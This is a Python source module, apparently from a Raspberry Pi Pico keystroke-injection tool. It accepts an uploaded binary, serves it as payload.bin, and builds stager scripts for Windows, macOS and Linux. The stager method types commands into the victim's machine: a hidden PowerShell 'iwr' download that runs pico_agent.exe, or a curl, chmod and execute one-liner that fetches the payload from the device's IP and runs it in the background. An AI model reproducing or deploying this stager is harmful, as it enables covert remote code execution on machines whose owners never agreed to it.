import gc
import os

from ._http import (
    _FILE_CHUNK_SIZE,
    _MAX_BINARY_SIZE,
    _PAYLOAD_BIN,
    _STATIC_DIR,
)


class _BinaryMixin:
    # Attributes provided by SetupServer.__init__
    _ap_ip: str

    # Methods provided by SetupServer / other mixins
    def _is_authorized(self, request) -> bool: ...
    async def _send_json(self, writer, request, status: str, data: dict[str, object]) -> None: ...
    async def _send_headers(self, writer, request, status: str, headers=None) -> None: ...

    def _ensure_static_dir(self) -> None:
        try:
            os.mkdir(_STATIC_DIR)
        except OSError as exc:
            if exc.args[0] != 17:  # EEXIST
                raise

    def _has_binary(self) -> bool:
        try:
            os.stat(_PAYLOAD_BIN)
            return True
        except OSError:
            return False

    def _stager_script(self, target_os: str) -> str:
        url = 'http://' + self._ap_ip + '/static/payload.bin'
        if target_os == 'windows':
            cmd = (
                'powershell -w hidden -c "iwr '
                + url
                + ' -OutFile $env:TEMP\\pico_agent.exe; & $env:TEMP\\pico_agent.exe"'
            )
            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'
        curl_cmd = (
            'curl -s '
            + url
            + ' -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &'
        )
        if target_os == 'macos':
            return (
                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
                'DELAY 600\nSTRING ' + curl_cmd + '\nENTER'
            )
        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + curl_cmd + '\nENTER'

    async def _handle_binary_upload_stream(
        self, reader, writer, partial, content_length: int
    ) -> None:
        if not self._is_authorized(partial):
            await self._send_json(
                writer, partial, '401 Unauthorized', {'message': 'Sign in required.'}
            )
            return

        if not content_length:
            await self._send_json(
                writer, partial, '400 Bad Request', {'message': 'No content received.'}
            )
            return

        if content_length > _MAX_BINARY_SIZE:
            remaining = content_length
            while remaining > 0:
                chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
                if not chunk:
                    break
                remaining -= len(chunk)
            await self._send_json(
                writer,
                partial,
                '413 Content Too Large',
                {
                    'message': (f'Binary too large (max {_MAX_BINARY_SIZE // (1024 * 1024)} MB).'),
                    'notice': 'error',
                },
            )
            return

        written = 0
        try:
            self._ensure_static_dir()
            gc.collect()
            with open(_PAYLOAD_BIN, 'wb') as f:
                remaining = content_length
                while remaining > 0:
                    chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
                    if not chunk:
                        break
                    f.write(chunk)
                    written += len(chunk)
                    remaining -= len(chunk)
        except (OSError, MemoryError):
            await self._send_json(
                writer,
                partial,
                '500 Internal Server Error',
                {'message': 'Write failed. Check available flash space.', 'notice': 'error'},
            )
            return

        fname = partial['headers'].get('x-filename', 'payload.bin')
        await self._send_json(
            writer,
            partial,
            '200 OK',
            {
                'message': f'Binary uploaded ({written} bytes).',
                'notice': 'success',
                'size': written,
                'filename': fname,
            },
        )

    async def _serve_payload(self, writer, request) -> None:
        try:
            fstat = os.stat(_PAYLOAD_BIN)
            file_size = fstat[6]
        except OSError:
            await self._send_json(
                writer, request, '404 Not Found', {'message': 'No payload staged.'}
            )
            return
        await self._send_headers(
            writer,
            request,
            '200 OK',
            headers={
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': 'attachment; filename="payload.bin"',
                'Content-Length': str(file_size),
            },
        )
        try:
            with open(_PAYLOAD_BIN, 'rb') as fh:
                while True:
                    chunk = fh.read(_FILE_CHUNK_SIZE)
                    if not chunk:
                        break
                    writer.write(chunk)
                    await writer.drain()
        except OSError:
            pass
